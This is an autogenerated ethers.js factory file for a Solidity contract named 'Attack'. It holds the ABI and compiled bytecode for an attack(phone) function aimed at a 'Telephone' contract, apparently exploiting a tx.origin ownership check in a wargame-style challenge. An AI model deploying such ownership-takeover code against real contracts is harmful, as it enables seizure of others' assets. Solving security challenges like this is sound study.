/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { Attack, AttackInterface } from "../Attack";

const _abi = [
  {
    inputs: [
      {
        internalType: "contract Telephone",
        name: "phone",
        type: "address",
      },
    ],
    name: "attack",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const _bytecode =
  "0x608060405234801561001057600080fd5b506101ec806100206000396000f3fe608060405234801561001057600080fd5b5060043610610048576000357c010000000000000000000000000000000000000000000000000000000090048063d018db3e1461004d575b600080fd5b61006760048036038101906100629190610108565b610069565b005b8073ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1326040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016100be9190610140565b600060405180830381600087803b1580156100d857600080fd5b505af11580156100ec573d6000803e3d6000fd5b5050505050565b6000813590506101028161019f565b92915050565b60006020828403121561011a57600080fd5b6000610128848285016100f3565b91505092915050565b61013a8161015b565b82525050565b60006020820190506101556000830184610131565b92915050565b60006101668261017f565b9050919050565b60006101788261015b565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6101a88161016d565b81146101b357600080fd5b5056fea264697066735822122040ebabf539b1f1dd7c3ca4a7067d88a318e3b5eed9650586ee52631a4773b14d64736f6c63430008000033";

type AttackConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AttackConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class Attack__factory extends ContractFactory {
  constructor(...args: AttackConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "Attack";
  }

  deploy(
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<Attack> {
    return super.deploy(overrides || {}) as Promise<Attack>;
  }
  getDeployTransaction(
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(overrides || {});
  }
  attach(address: string): Attack {
    return super.attach(address) as Attack;
  }
  connect(signer: Signer): Attack__factory {
    return super.connect(signer) as Attack__factory;
  }
  static readonly contractName: "Attack";
  public readonly contractName: "Attack";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackInterface {
    return new utils.Interface(_abi) as AttackInterface;
  }
  static connect(address: string, signerOrProvider: Signer | Provider): Attack {
    return new Contract(address, _abi, signerOrProvider) as Attack;
  }
}
